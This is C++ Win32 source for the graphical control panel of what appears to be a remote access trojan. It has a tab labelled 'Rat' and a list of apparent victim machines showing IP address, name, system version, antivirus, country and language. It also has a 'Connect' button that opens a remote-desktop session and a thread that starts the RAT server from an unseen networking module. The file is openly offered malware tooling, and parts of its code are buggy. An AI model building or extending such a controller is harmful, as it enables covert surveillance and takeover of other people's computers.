//#include "Networking.h"
#include "Networking.h"
#include "resource\resource.h"


using namespace Gdiplus;
// Enable Visual Style
#if defined _M_IX86
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='x86' publicKeyToken='6595b64144ccf1df' language='*'\"")
#elif defined _M_IA64
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='ia64' publicKeyToken='6595b64144ccf1df' language='*'\"")
#elif defined _M_X64
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*'\"")
#else
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
#endif
#pragma endregion

enum windowtoopenenumt { none, window2, window3, window4 };
windowtoopenenumt windowtoopenenum = none;
static HWND hList = NULL;  // List View identifier
LVCOLUMN LvCol; // Make Coluom struct for ListView
LVITEM LvItem;  // ListView Item struct
LV_DISPINFO lvd;
int iSelect = 0;
int index = 0;
int flag = 0;
HWND hEdit;
bool escKey = 0;
char tempstr[100] = "";
TCHAR tchar;
MSG msg;
HWND ListHwnd;
HWND handleforwindowlooking;
WNDCLASSEX windowclassforwindow2;
HWND handleforwindow2;
#define RemoteDesktop MAKEINTRESOURCE(100);
//===================================================

//======================Handles================================================//
HINSTANCE hInst; // main function handler
#define WIN32_LEAN_AND_MEAN // this will assume smaller exe

HMENU hmenu;
LRESULT CALLBACK MainDlgProcedure(HWND handleforwindow1, UINT message, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK windowprocessforwindow2(HWND handleforwindow1, UINT message, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK windowprocessforwindow3(HWND& handleforwindow1, HINSTANCE& hInst, int nShowCmd);
ICreateRemoteDesktop sesion1;
LRESULT CALLBACK ProcedureForThird(HWND handleforwindow, UINT msg, WPARAM wParam, LPARAM lParam);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
HINSTANCE  hInst1;
#define createwindowbuttoninwindow1 101
#define createwindowbuttoninwindow2 201
#define createwindowbuttoninwindow3 301
#define ID_BUTTON_RD 1
#define   IDB_ANIMMAIN_1                501 


int showcmd;
bool window1open, window2open, window3open, window4open = false;
bool windowclass1registeredbefore, windowclass2registeredbefore,
windowclass3registeredbefore, windowclass4registeredbefore = false;
HWND  Connect;
HWND  Disconnect;
HWND infoLog;
HWND infoLog_P2;
void createwindow2(WNDCLASSEX& wc, HWND& hwnd, HINSTANCE hInst, int nShowCmd);
HMENU hMenu;







LPTSTR LoadStringDx(INT nID)
{
	static UINT s_index = 0;
	const UINT cchBuffMax = 1024;
	static TCHAR s_sz[2][cchBuffMax];

	TCHAR* pszBuff = s_sz[s_index];
	s_index = (s_index + 1) % ARRAYSIZE(s_sz);
	pszBuff[0] = 0;
	if (!::LoadString(NULL, nID, pszBuff, cchBuffMax))

		return pszBuff;
}



HINSTANCE g_hinst;


HWND page1, page2, page3;
HWND tab;

void initwindows()
{

	if (windowtoopenenum != none) {
		switch (windowtoopenenum) {
		case window2:
			if (window2open == false) {
				createwindow2(windowclassforwindow2, handleforwindow2, hInst, showcmd);
			}
			break;
		case window3:
		{
			windowprocessforwindow3(handleforwindow2, hInst, showcmd);
		}
		break;
		}
		windowtoopenenum = none;
	}
}


BOOL CALLBACK DialogPage(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
	switch (msg) {
	case WM_COMMAND:
		switch (wp) {
			break;
		}
	case WM_INITDIALOG:
	{
		infoLog_P2 = CreateWindow("edit", 0, WS_CHILD | WS_VISIBLE  , 20, 150, 350, 150, hwnd, 0, hInst, 0);

		break;
	}
	}
	return FALSE;
}

HWND curr;
void OnSelChange() {
	int sel = TabCtrl_GetCurSel(tab);
	ShowWindow(page1, (sel == 0) ? SW_SHOW : SW_HIDE);
	ShowWindow(page2, (sel == 1) ? SW_SHOW : SW_HIDE);


}

bool is_Item;



HWND CreateButton(LPCSTR lpButtonName, HWND hWnd, int x, int y) {
	return CreateWindow("button", lpButtonName, WS_EX_TRANSPARENT | BS_OWNERDRAW | WS_CHILD | WS_VISIBLE, x, y, 150, 50, hWnd, (HMENU)ID_BUTTON_RD, (HINSTANCE)hWnd, 0);
}

void AddText(HWND edit, LPCTSTR Text)
{
	int len = GetWindowTextLength(edit);
	SendMessage(edit, EM_SETSEL, (WPARAM)len, (LPARAM)len);
	SendMessage(edit, EM_REPLACESEL, 0, (LPARAM)Text);
}
LRESULT CALLBACK windowprocessforwindow2(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam) {


	GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR           gdiplusToken;
	GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
	CoInitialize(0);

	switch (message) {



	case WM_DRAWITEM:
	{



		LPDRAWITEMSTRUCT pDIS;
		pDIS = (LPDRAWITEMSTRUCT)lParam;
		CHAR staticText[99];
		int len = SendMessage(pDIS->hwndItem, WM_GETTEXT, ARRAYSIZE(staticText), (LPARAM)staticText);

		if (pDIS->hwndItem == Connect || pDIS->hwndItem == Disconnect) {



			SetBkMode(pDIS->hDC, TRANSPARENT);
			FillRect(pDIS->hDC, &pDIS->rcItem, CreateSolidBrush(RGB(0, 0, 0)));
			SetTextColor(pDIS->hDC, RGB(100, 255, 255));
			DrawTextA(pDIS->hDC, staticText, strlen(staticText), &pDIS->rcItem, DT_CENTER | DT_SINGLELINE | DT_VCENTER);
			SetTextColor(pDIS->hDC, RGB(0, 0, 0));
			SelectObject(pDIS->hDC, GetStockObject(NULL_BRUSH));
			SelectObject(pDIS->hDC, CreatePen(PS_DOT, 1, RGB(0, 0, 0)));



			Rectangle(
				pDIS->hDC,
				pDIS->rcItem.left,
				pDIS->rcItem.top,
				pDIS->rcItem.right,
				pDIS->rcItem.bottom
			);
		}
		break;

	}

	case WM_DESTROY:
		window2open = false;
		break;
	case WM_COMMAND:
	{

		if ((HWND)lParam == Connect) {



			windowtoopenenum = window3;
			initwindows();
			sesion1.window123 = handleforwindowlooking;
			sesion1.commandlist_p = "remotedesktop";
			AddText(infoLog, " Beggining thread... \n");





			//sesion1.init_server(hwnd);





		}
		if ((HWND)lParam == Disconnect) {


			AddText(infoLog, " Initializing... \n");


		}
		int wmId = LOWORD(wParam);

		switch (wmId)
		{
		default:
			return DefWindowProc(hwnd, message, wParam, lParam);
		}
	}
	break;



	}
	return DefWindowProc(hwnd, message, wParam, lParam);
}

void createwindow2(WNDCLASSEX& wc, HWND& hwnd, HINSTANCE hInst, int nShowCmd) {
	if (windowclass2registeredbefore == false) {
		ZeroMemory(&wc, sizeof(WNDCLASSEX));
		wc.cbClsExtra = NULL;
		wc.cbSize = sizeof(WNDCLASSEX);
		wc.cbWndExtra = NULL;
		wc.hbrBackground = (HBRUSH)COLOR_WINDOW;
		wc.hCursor = LoadCursor(NULL, IDC_ARROW);
		wc.hIcon = NULL;
		wc.hIconSm = NULL;
		wc.hInstance = hInst;
		wc.lpfnWndProc = (WNDPROC)windowprocessforwindow2;
		wc.lpszClassName = "wc2";
		wc.lpszMenuName = NULL;
		wc.style = CS_HREDRAW | CS_VREDRAW;

		if (!RegisterClassEx(&wc))
		{
			int nResult = GetLastError();
			MessageBox(NULL,
				"Window class creation failed",
				"Window Class Failed",
				MB_ICONERROR);
		}
		else
			windowclass2registeredbefore = true;
	}
	hwnd = CreateWindowEx(NULL,
		wc.lpszClassName,
		"Window 2",
		WS_OVERLAPPEDWINDOW,
		720,
		200,
		1000,
		900,
		NULL,
		NULL,
		hInst,
		NULL                /* No Window Creation data */
	);





	Connect = CreateButton("Connect", hwnd, 20, 20);


	Disconnect = CreateButton("Disconnect", hwnd, 500, 20);


	infoLog = CreateWindow("edit", 0, WS_CHILD | WS_VISIBLE | ES_MULTILINE | WS_VSCROLL | ES_AUTOVSCROLL, 20, 150, 350, 150, hwnd, 0, hInst, 0);
	if (!hwnd)
	{
		int nResult = GetLastError();

		MessageBox(NULL,
			"Window creation failed",
			"Window Creation Failed",
			MB_ICONERROR);
	}

	ShowWindow(hwnd, nShowCmd);
}

VOID APIENTRY HandlePopupMenu(HWND hwnd, POINT pt)
{
	// menu template          
	HMENU hmenuTrackPopup;  // shortcut menu   



	hmenu = LoadMenu(hInst, "PopUp");
	if (hmenu == NULL)
		return;

	MENUINFO mi;
	memset(&mi, 0, sizeof(mi));
	mi.cbSize = sizeof(mi);
	mi.fMask = MIM_STYLE;
	mi.dwStyle = MNS_NOTIFYBYPOS;
	SetMenuInfo(hmenu, &mi);

	hmenuTrackPopup = GetSubMenu(hmenu, 0);

	MENUINFO mi1;
	memset(&mi1, 0, sizeof(mi));
	mi1.cbSize = sizeof(mi);
	mi1.fMask = MIM_STYLE;
	mi1.dwStyle = MNS_NOTIFYBYPOS;
	SetMenuInfo(hmenuTrackPopup, &mi1);

	ClientToScreen(hwnd, (LPPOINT)&pt);

	// Draw and track the shortcut menu.  

	TrackPopupMenu(hmenuTrackPopup, TPM_LEFTALIGN | TPM_LEFTBUTTON,
		pt.x, pt.y, 0, hwnd, NULL);

	// Destroy the menu. 

	DestroyMenu(hmenu);
}

LRESULT ProcessCustomDraw(LPARAM lParam)
{
	LPNMLVCUSTOMDRAW lplvcd = (LPNMLVCUSTOMDRAW)lParam;

	switch (lplvcd->nmcd.dwDrawStage)
	{
	case CDDS_PREPAINT: //Before the paint cycle begins
		//request notifications for individual listview items
		return CDRF_NOTIFYITEMDRAW;

	case CDDS_ITEMPREPAINT: //Before an item is drawn
	{
		return CDRF_NOTIFYSUBITEMDRAW;
	}
	break;

	case CDDS_SUBITEM | CDDS_ITEMPREPAINT: //Before a subitem is drawn
	{
		switch (lplvcd->iSubItem)
		{
		case 0:
		{
			lplvcd->clrText = RGB(0, 0, 0);
			lplvcd->clrTextBk = RGB(240, 55, 23);
			HFONT  hFont = CreateFont(16, 0, 0, 0, FW_SEMIBOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
				CLIP_DEFAULT_PRECIS, ANTIALIASED_QUALITY, VARIABLE_PITCH, TEXT("Arial"));
			SelectObject(lplvcd->nmcd.hdc, hFont);
			return CDRF_NEWFONT;
		}
		break;

		case 1:
		{
			lplvcd->clrText = RGB(0, 0, 0);
			lplvcd->clrTextBk = RGB(200, 200, 10);
			return CDRF_NEWFONT;
		}
		break;

		case 2:
		{
			lplvcd->clrText = RGB(0, 0, 0);
			lplvcd->clrTextBk = RGB(200, 200, 10);
			return CDRF_NEWFONT;
		}
		break;

		case 3:
		{
			lplvcd->clrText = RGB(0, 0, 0);
			lplvcd->clrTextBk = RGB(200, 200, 10);
			return CDRF_NEWFONT;
		}
		break;

		case 4:
		{
			lplvcd->clrText = RGB(0, 0, 0);
			lplvcd->clrTextBk = RGB(200, 200, 10);
			return CDRF_NEWFONT;
		}
		break;

		case 5:
		{
			lplvcd->clrText = RGB(0, 0, 0);
			lplvcd->clrTextBk = RGB(200, 200, 10);
			return CDRF_NEWFONT;

		}
		break;
		case 6:
		{
			lplvcd->clrText = RGB(0, 0, 0);
			lplvcd->clrTextBk = RGB(200, 200, 10);
			return CDRF_NEWFONT;
		}
		break;

		}

	}
	}
	return CDRF_DODEFAULT;
}


void __cdecl ThreadProc(void* Args)
{

	sesion1.infoLog_p = infoLog_P2;
	sesion1.init_server(sesion1.infoLog_p);

	_endthread();
}

//================================About dialog window=============================//
BOOL CALLBACK DialogProc1(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
{

	PAINTSTRUCT ps;
	RECT rc;    // client area             
	POINT pt;   // location of mouse click
	switch (Message)
	{

		// This Window Message will close the dialog  //
	   //============================================//

	case WM_CLOSE:
	{
		PostQuitMessage(0);
		EndDialog(hWnd, 0); // kill dialog
	}
	break;



	break; //Ensure that after that there is a DefWindowProc 
	case WM_NOTIFY:
	{
		switch (LOWORD(wParam))
		{
		case IDC_LIST:
			LPNMLISTVIEW pnm = (LPNMLISTVIEW)lParam;

			if (pnm->hdr.hwndFrom == hList && pnm->hdr.code == NM_CUSTOMDRAW)
			{
				SetWindowLong(hWnd, DWL_MSGRESULT, (LONG)ProcessCustomDraw(lParam));
				return TRUE;
			}
			if (((LPNMHDR)lParam)->code == NM_RCLICK)
			{
				char Text[255] = { 0 };
				char Temp[255] = { 0 };
				char Temp1[255] = { 0 };
				int iSlected = 0;
				int j = 0;

				// Get the bounding rectangle of the client area. 

				GetClientRect(hWnd, (LPRECT)&rc);

				// Get the client coordinates for the mouse click.  

				pt.x = 500;

				pt.y = GET_Y_LPARAM(lParam);
				pt.y -= 100;

				// If the mouse click took place inside the client 
				// area, execute the application-defined function 
				// that displays the shortcut menu. 


				HandlePopupMenu(hWnd, pt);

				iSlected = SendMessage(hList, LVM_GETNEXTITEM, -1, LVNI_FOCUSED);

				if (iSlected == -1)
				{
					MessageBox(hWnd, "No Items in ListView", "Error", MB_OK | MB_ICONINFORMATION);

					is_Item = false;
					break;
				}
				else
					{
					is_Item = true;

				}

				memset(&LvItem, 0, sizeof(LvItem));
				LvItem.mask = LVIF_TEXT;
				LvItem.iSubItem = 0;
				LvItem.pszText = Text;
				LvItem.cchTextMax = 256;
				LvItem.iItem = iSlected;

				SendMessage(hList, LVM_GETITEMTEXT, iSlected, (LPARAM)&LvItem);

				sprintf(Temp1, Text);

				for (j = 1; j <= 7; j++)
				{
					LvItem.iSubItem = j;
					SendMessage(hList, LVM_GETITEMTEXT, iSlected, (LPARAM)&LvItem);
					sprintf(Temp, " %s", Text);
					lstrcat(Temp1, Temp);
				}

				// MessageBox(hWnd,Temp1,"test",MB_OK);

			}
			if (((LPNMHDR)lParam)->code == NM_CLICK)
			{
				iSelect = SendMessage(hList, LVM_GETNEXTITEM, -1, LVNI_FOCUSED);

				if (iSelect == -1)
				{
					break;
				}
				index = iSelect;
				flag = 1;
			}

			if (((LPNMHDR)lParam)->code == LVN_BEGINLABELEDIT)
			{
				//Editing=1;
				hEdit = ListView_GetEditControl(hList);
				GetWindowText(hEdit, tempstr, sizeof(tempstr));
			}

			if (((LPNMHDR)lParam)->code == LVN_ENDLABELEDIT)
			{
				int iIndex;
				char text[255] = "";

				tchar = (TCHAR)msg.wParam;
				if (tchar == 0x1b)
					escKey = 1;

				iIndex = SendMessage(hList, LVM_GETNEXTITEM, -1, LVNI_FOCUSED);
				if (iIndex == -1)
					break;

				LvItem.iSubItem = 0;

				if (escKey == 0)
				{
					LvItem.pszText = text;
					GetWindowText(hEdit, text, sizeof(text));
					SendMessage(hList, LVM_SETITEMTEXT, (WPARAM)iIndex, (LPARAM)&LvItem);
				}
				else {
					LvItem.pszText = tempstr;
					SendMessage(hList, LVM_SETITEMTEXT, (WPARAM)iIndex, (LPARAM)&LvItem);
					escKey = 0;
				}
				//Editing=0;
			}
			break;
		}
	}

	case WM_PAINT:
	{
		return 0;
	}
	break;




	case WM_MENUCOMMAND:
	{


		HMENU menu = (HMENU)lParam;
		int idx = wParam;

		char buffer[20];
		_itoa_s(idx, buffer, 20, 2);
		LPCSTR p = buffer;


		//is_Item == true
		if (idx == 0  && is_Item == true)
		{
			windowtoopenenum = window2;
			initwindows();

		}

	}
	break; //Ensure that after that there is a DefWindowProc call


	if (windowtoopenenum != none) {
		switch (windowtoopenenum) {
		case window2:
			if (window2open == false) {
				createwindow2(windowclassforwindow2, handleforwindow2, hInst, 0);
			}
			break;
		case window3:
		{
			windowprocessforwindow3(handleforwindow2, hInst, 0);
		}
		break;
		}
		windowtoopenenum = none;
	}
	// This Window Message is the heart of the dialog  //
	//================================================//
	case WM_INITDIALOG:
	{


		HFONT hFont = CreateFont(18, 0, 0, 0, FW_DONTCARE, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
			CLIP_DEFAULT_PRECIS, ANTIALIASED_QUALITY, VARIABLE_PITCH, TEXT("Brutal Font Pro"));

		//sesion1.currproc = hWnd;
		int i;
		char Temp[255];
		LVBKIMAGE plvbki = { 0 };
		char url[] = "C:\\a.jpg";
		InitCommonControls();
		hList = GetDlgItem(hWnd, IDC_LIST); // get the ID of the ListView				 
		SetWindowTheme(hList, L"DarkMode_Explorer", NULL);
		memset(&plvbki, 0, sizeof(plvbki));
		plvbki.ulFlags = LVBKIF_SOURCE_URL;
		plvbki.pszImage = url;
		plvbki.xOffsetPercent = 40;
		plvbki.yOffsetPercent = 15;

		OleInitialize(NULL);

		ListHwnd = hList;
		SendMessage(hList, LVM_SETTEXTBKCOLOR, 0, (LPARAM)CLR_NONE);
		SendMessage(hList, LVM_SETBKIMAGE, 0, (LPARAM)(LPLVBKIMAGE)&plvbki);

		SendMessage(hList, LVM_SETEXTENDEDLISTVIEWSTYLE, 0, LVS_EX_FULLROWSELECT); // Set style

		SendMessageA(hWnd, WM_SETICON, (WPARAM)1, (LPARAM)LoadIconA(hInst, MAKEINTRESOURCE(IDI_ICON1)));

		// Here we put the info on the Coulom headers
		// this is not data, only name of each header we like
		memset(&LvCol, 0, sizeof(LvCol)); // Reset Coluom
		LvCol.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM | LVCF_FMT; // Type of mask
		LvCol.fmt |= LVCFMT_RIGHT;

		LvCol.pszText = "Ip addres";                     // First Header
		LvCol.cx = 0xC8;

		// Inserting Couloms as much as we want
		WNDCLASSEX windowclassforwindow2;
		HWND handleforwindow2;
		SendMessage(hList, LVM_INSERTCOLUMN, 0, (LPARAM)&LvCol); // Insert/Show the coloum
		LvCol.cx = 0xAA;
		LvCol.pszText = "name";                          // Next coloum
		LvCol.fmt |= LVCFMT_CENTER;
		SendMessage(hList, LVM_INSERTCOLUMN, 1, (LPARAM)&LvCol); // ...
		LvCol.pszText = "system version";                       //
		SendMessage(hList, LVM_INSERTCOLUMN, 2, (LPARAM)&LvCol); //
		LvCol.pszText = "status";                              //
		SendMessage(hList, LVM_INSERTCOLUMN, 3, (LPARAM)&LvCol); //
		LvCol.pszText = "antivirus";                            //
		SendMessage(hList, LVM_INSERTCOLUMN, 4, (LPARAM)&LvCol); //
		LvCol.pszText = "country";
		SendMessage(hList, LVM_INSERTCOLUMN, 5, (LPARAM)&LvCol); //
		LvCol.pszText = "language";

		SendMessage(hList, LVM_INSERTCOLUMN, 6, (LPARAM)&LvCol); // ...same as above
		LvCol.fmt = LVCFMT_LEFT;
		LvCol.fmt |= LVCFMT_RIGHT;
		LvCol.cx = 0x46;
		LvCol.pszText = "time";

		SendMessage(hList, LVM_INSERTCOLUMN, 7, (LPARAM)&LvCol); // ...same as above

		ListView_SetExtendedListViewStyle(hList,
			ListView_GetExtendedListViewStyle(hList) | LV_VIEW_DETAILS | LVS_REPORT | LVS_NOCOLUMNHEADER | LVS_OWNERDRAWFIXED);
		SendMessage(hWnd, WM_SETFONT, (WPARAM)CreateFont(12, 0, 0, 0, 0, TRUE, 0, 0, 0, 0, 0, 0, 0, "Tahoma"), (LPARAM)1);
		memset(&LvItem, 0, sizeof(LvItem)); // Reset Item Struct

		//  Setting properties Of Items:

		/*LvItem.mask=LVIF_TEXT | LVCFMT_CENTER;   // Text Style
		LvItem.cchTextMax = 256; // Max size of test

		LvItem.iItem=0;          // choose item
		LvItem.iSubItem=0;       // Put in first coluom
		LvItem.pszText="Item 0"; // Text to display (can be from a char variable) (Items)
		LvItem.piColFmt = (int*)LvCol.fmt;

		SendMessage(hList,LVM_INSERTITEM,0,(LPARAM)&LvItem); // Send to the Listview

		for(i=0;i<=7;i++) // Add SubItems in a loop
		{
			LvItem.iSubItem=i;
			sprintf(Temp,"SubItem %d",i);
			LvItem.pszText=Temp;
			SendMessage(hList,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems
		}
		*/



		SendMessage(hWnd,             // Handle of edit control
			WM_SETFONT,         // Message to change the font
			(WPARAM)hFont,     // handle of the font
			MAKELPARAM(TRUE, 0) // Redraw text
		);
		SendMessage(hList,             // Handle of edit control
			WM_SETFONT,         // Message to change the font
			(WPARAM)hFont,     // handle of the font
			MAKELPARAM(TRUE, 0) // Redraw text
		);


		ShowWindow(hWnd, SW_NORMAL);
		UpdateWindow(hWnd);

		sesion1.LvItem_p = LvItem;
		sesion1.hList_p = hList;

		SetWindowTheme(hWnd, L"DarkMode_Explorer", NULL);





	}
	break;


	case WM_COMMAND:
	{



		switch (LOWORD(wParam)) // what we press on?
		{

		case IDC_ADDITEM:
		{
			int iItem;
			char ItemText[100];

			iItem = SendMessage(hList, LVM_GETITEMCOUNT, 0, 0);

			GetDlgItemText(hWnd, IDC_ADD, ItemText, 100);

			if ((lstrlen(ItemText)) == 0)
			{
				MessageBox(hWnd, "Please Write Some Text", "Error", MB_OK | MB_ICONINFORMATION);
				break;
			}

			LvItem.iItem = iItem;            // choose item  
			LvItem.iSubItem = 0;         // Put in first coluom
			LvItem.pszText = ItemText;   // Text to display (can be from a char variable) (Items)
			SendMessage(hList, LVM_INSERTITEM, 0, (LPARAM)&LvItem); // Send to the Listview
		}
		break;

		case IDC_ADDSUBITEM:
		{
			int Item, i;
			char SubItemText[100];

			Item = SendMessage(hList, LVM_GETITEMCOUNT, 0, 0);

			GetDlgItemText(hWnd, IDC_ADDSUB, SubItemText, 100);

			if ((lstrlen(SubItemText)) == 0)
			{
				MessageBox(hWnd, "Please Write Some Text", "Error", MB_OK | MB_ICONINFORMATION);
				break;
			}

			LvItem.iItem = Item - 1;            // choose item  

			for (i = 1; i <= 5; i++)
			{
				LvItem.pszText = SubItemText;   // Text to display (can be from a char variable) (Items)
				LvItem.iSubItem = i;         // Put in first coluom

				SendMessage(hList, LVM_SETITEM, 0, (LPARAM)&LvItem);
			}
		}
		break;

		case IDC_BOTH:
		{
			int itemIndex, j;
			char iSubItemText[100] = "";
			char iItemText[100] = "";

			itemIndex = SendMessage(hList, LVM_GETITEMCOUNT, 0, 0);

			GetDlgItemText(hWnd, IDC_ADD, iItemText, 100);
			GetDlgItemText(hWnd, IDC_ADDSUB, iSubItemText, 100);

			if ((lstrlen(iSubItemText) && lstrlen(iItemText)) == 0)
			{
				MessageBox(hWnd, "Please Write Some Text", "Error", MB_OK | MB_ICONINFORMATION);
				break;
			}

			LvItem.iItem = itemIndex;            // choose item  
			LvItem.iSubItem = 0;
			LvItem.pszText = iItemText;
			SendMessage(hList, LVM_INSERTITEM, 0, (LPARAM)&LvItem);

			for (j = 1; j <= 6; j++)
			{
				LvItem.pszText = iSubItemText;   // Text to display (can be from a char variable) (Items)
				LvItem.iSubItem = j;         // Put in first coluom
				SendMessage(hList, LVM_SETITEM, 0, (LPARAM)&LvItem);
			}
		}
		break;

		case IDC_DELALL:
			SendMessage(hList, LVM_DELETEALLITEMS, 0, 0);
			break;

		case IDC_DELSELITEM:
			if (flag)
				SendMessage(hList, LVM_DELETEITEM, iSelect, 0);
			flag = 0;
			break;

		case IDC_RENAME:
		{
			if (index == -1)
			{
				MessageBox(hWnd, "Nothing to rename", "error", MB_OK);
			}
			else {
				//Editing=1;
				SendMessage(hList, LVM_EDITLABEL, (WPARAM)index, (LPARAM)0);
			}
		}
		break;

		case IDC_SELECT_ALL:
		{
			ListView_SetItemState(hList, -1, 0, LVIS_SELECTED); // deselect all
			SendMessage(hList, LVM_ENSUREVISIBLE, (WPARAM)-1, FALSE); // Send to the Listview                        
			ListView_SetItemState(hList, -1, LVIS_SELECTED, LVIS_SELECTED);
		}
		break;

		case IDC_LAST_ITEM:
		{
			int items;
			items = SendMessage(hList, LVM_GETITEMCOUNT, (WPARAM)0, (LPARAM)0);
			items--;
			ListView_SetItemState(hList, -1, 0, LVIS_SELECTED); // deselect all
			SendMessage(hList, LVM_ENSUREVISIBLE, (WPARAM)items, FALSE); // Send to the Listview
			ListView_SetItemState(hList, items, LVIS_SELECTED, LVIS_SELECTED);
			ListView_SetItemState(hList, items, LVIS_FOCUSED, LVIS_FOCUSED);

		}
		break;

		}
	}
	break;

	default:
	{
		return FALSE;
	}
	}

	return TRUE;
}
MSG msg1;

BOOL CALLBACK DialogProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
	switch (msg) {
	case WM_INITDIALOG: {



		page1 = CreateDialog(g_hinst, MAKEINTRESOURCE(IDC_DIALOG), hwnd, DialogProc1);
		
		page2 = CreateDialog(g_hinst, MAKEINTRESOURCE(IDD_TAB_BASIC), hwnd, DialogPage);
		// data.tab = CreateDialog(g_hinst, MAKEINTRESOURCE(IDD_DIALOG_PAGE1), hwnd, DialogPage);


		tab = GetDlgItem(hwnd, IDC_TAB);
		if (tab)
		{



			TCITEM tci = { 0 };
			tci.mask = TCIF_TEXT;

			const char* file1 = "Rat";
			char* ptr1 = (char*)file1;
			tci.pszText = ptr1;
			TabCtrl_InsertItem(tab, 0, &tci);



			const char* file = "Logs";
			char* ptr2 = (char*)file;

			tci.pszText = ptr2;
			TabCtrl_InsertItem(tab, 1, &tci);

			RECT rc;//find tab control's rectangle
			GetWindowRect(tab, &rc);
			POINT offset = { 0 };
			ScreenToClient(hwnd, &offset);
			OffsetRect(&rc, offset.x, offset.y);


			RECT rc_page1;
			GetWindowRect(page1, &rc_page1);
			POINT offset_page1 = { 0 };
			ScreenToClient(hwnd, &offset_page1);
			OffsetRect(&rc_page1, offset_page1.x, offset_page1.y);

			POINT offset_page2 = { 0 };
			RECT rc_page2 = { 0 };
			ScreenToClient(hwnd, &offset_page2);
			OffsetRect(&rc_page2, offset_page2.x, offset_page2.y);
			rc.top += 25;
			rc.left += 5;

			int Width = rc.right - rc.left;
			int Height = rc.bottom - rc.top;


			int Width_page1 = rc_page1.right - rc.left;
			int Height_page1 = rc_page1.bottom - rc.top;




			int Width_page2 = rc_page2.right - rc.left;
			int Height_page2 = rc_page2.top - rc.bottom;


			SetWindowPos(page1, 0, rc.left, rc.top, (rc.right - rc.left) - 5, (rc.bottom - rc.top) - 5, SWP_HIDEWINDOW);
			SetWindowPos(page2, 0, rc.left , rc.top, (rc.right - rc.left) - 5, (rc.bottom - rc.top) - 5, SWP_HIDEWINDOW);

			OnSelChange();
			_beginthread(ThreadProc, 0, 0);




		}
	

		break;

	}



	case WM_NOTIFY: {
		switch (((LPNMHDR)lp)->code) {
		case TCN_SELCHANGE:
			OnSelChange();
			break;
		}
	}
				  break;

	case WM_COMMAND:
		switch (wp) {
		case IDOK: EndDialog(hwnd, wp);  break;
		case IDCANCEL:  EndDialog(hwnd, wp);  break;
		}
	}

	return FALSE;
}
//===========================MAIN FUNCTION-WIN32 STARTING POINT========================================//
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
{

	showcmd = iCmdShow;
	INITCOMMONCONTROLSEX InitCtrls;
	InitCtrls.dwICC = ICC_LISTVIEW_CLASSES;
	InitCtrls.dwSize = sizeof(INITCOMMONCONTROLSEX);

	BOOL bRet = InitCommonControlsEx(&InitCtrls);

	hInst = hInstance;
	LvCol.fmt |= LVCFMT_CENTER;;

	g_hinst = hInstance;
	DialogBox(hInstance, MAKEINTRESOURCE(IDD_CTABCTRLSSL_DEMO_DIALOG), 0, DialogProc);

	//DialogBoxParam(hInstance, MAKEINTRESOURCE(IDC_DIALOG), NULL, (DLGPROC)DialogProc1,0);
	return 0;
}

LRESULT CALLBACK windowprocessforwindow3(HWND& handleforwindow1, HINSTANCE& hInst, int nShowCmd)
{




	WNDCLASSEX windowclassforwindow2;
	ZeroMemory(&windowclassforwindow2, sizeof(WNDCLASSEX));
	windowclassforwindow2.cbClsExtra = NULL;
	windowclassforwindow2.cbSize = sizeof(WNDCLASSEX);
	windowclassforwindow2.cbWndExtra = NULL;
	windowclassforwindow2.hbrBackground = (HBRUSH)COLOR_WINDOW;
	windowclassforwindow2.hCursor = LoadCursor(NULL, IDC_ARROW);
	windowclassforwindow2.hIcon = NULL;
	windowclassforwindow2.hIconSm = NULL;
	windowclassforwindow2.hInstance = hInst;
	windowclassforwindow2.lpfnWndProc = (WNDPROC)ProcedureForThird;
	windowclassforwindow2.lpszClassName = "window class2";
	windowclassforwindow2.lpszMenuName = NULL;
	windowclassforwindow2.style = CS_HREDRAW | CS_VREDRAW;



	if (!RegisterClassEx(&windowclassforwindow2))
	{
		int nResult = GetLastError();
		MessageBox(NULL,
			"Window class creation failed for window 2",
			"Window Class Failed",
			MB_ICONERROR);
	}

	handleforwindowlooking = CreateWindowEx(NULL,
		windowclassforwindow2.lpszClassName,
		"Child Window",
		WS_OVERLAPPEDWINDOW,
		200,
		300,
		640,
		480,
		NULL,
		NULL,
		hInst,
		NULL);




	if (!handleforwindowlooking)
	{
		int nResult = GetLastError();

		MessageBox(NULL,
			"Window creation failed",
			"Window Creation Failed",
			MB_ICONERROR);
	}

	ShowWindow(handleforwindowlooking, nShowCmd);
	SetParent(handleforwindowlooking, handleforwindow1);

	return 0;

}
RECT rect;
LRESULT CALLBACK ProcedureForThird(HWND handleforwindow, UINT msg, WPARAM wParam, LPARAM lParam)
{



	switch (msg) {



	case WM_DRAWITEM:
	{




		break;

	}

	case WM_DESTROY:
		window2open = false;
		break;
	case WM_COMMAND:
	{

	}
	break;



	}
	return DefWindowProc(handleforwindow, msg, wParam, lParam);
}


